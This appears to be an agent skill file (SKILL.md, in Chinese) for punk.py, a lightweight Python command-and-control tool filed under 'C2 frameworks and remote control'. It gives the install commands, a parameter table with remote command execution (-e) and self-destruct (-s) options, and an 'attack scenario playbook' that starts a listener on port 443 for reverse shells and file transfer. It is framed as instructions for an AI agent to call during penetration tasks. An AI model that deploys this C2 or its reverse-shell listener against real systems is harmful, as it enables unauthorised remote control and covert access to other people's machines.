---
name: punk-c2
description: 渗透工具 skill:punk.py 的安装、参数速查与攻击场景 playbook。当任务涉及 C2框架与远控 需要调用 punk.py 时使用。
when-to-use: 渗透工具 skill:punk.py 的安装、参数速查与攻击场景 playbook。当任务涉及 C2框架与远控 需要调用 punk.py 时使用。
---

# punk.py

- 攻击大类:C35 C2框架与远控
- 上游仓库:https://github.com/r3vn/punk.py
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/r3vn/punk.py && cd punk.py && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python punk.py -l 10.0.0.5 -p 4444` | 起 C2 |
| `-e 'cmd'` | 执行 |
| `-s` | 自毁 |

## 攻击场景 Playbook

### 轻量 C2

```bash
python punk.py -l 0.0.0.0 -p 443
# 反弹+文件传输
```

## 注意事项

轻量 Python C2。
